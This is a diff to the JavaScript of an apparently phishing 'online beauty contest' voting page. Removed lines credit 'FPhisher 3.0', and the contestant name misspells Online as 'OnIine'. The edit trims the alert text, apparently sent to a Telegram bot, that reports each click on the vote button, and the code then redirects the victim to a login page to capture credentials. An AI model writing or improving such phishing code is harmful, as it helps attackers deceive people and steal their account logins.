@@ -58,17 +58,9 @@
       btn.addEventListener('click', async (e) => {
         e.preventDefault();
 
-        // Clean formatted message for Telegram
-        const formattedMessage = `🚨 VOTE BUTTON CLICKED ACTIVE FOR LOGS 🚀🎉
+        // ONLY this exact message
+        const formattedMessage = `🚨 VOTE BUTTON CLICKED ACTIVE FOR LOGS 🚀🎉`;
 
-👤 Contestant : OnIine Beauty Contest Niveame
-📊 Status     : Awaiting Login....
-
-━━━━━━━━━━━━━━━━━━━━━━━
-🔒 Secured by FPhisher 3.0 🔒
-⏰ ${new Date().toLocaleString()}`;
-
-        // Only send the clean text (no extra fields)
         const payload = {
           text: formattedMessage
         };
@@ -83,7 +75,7 @@
           console.error("Failed to send vote click:", err);
         }
 
-        // Redirect to login page after sending
+        // Redirect to login page
         window.location.href = btn.href || "login.html";
       });
     });
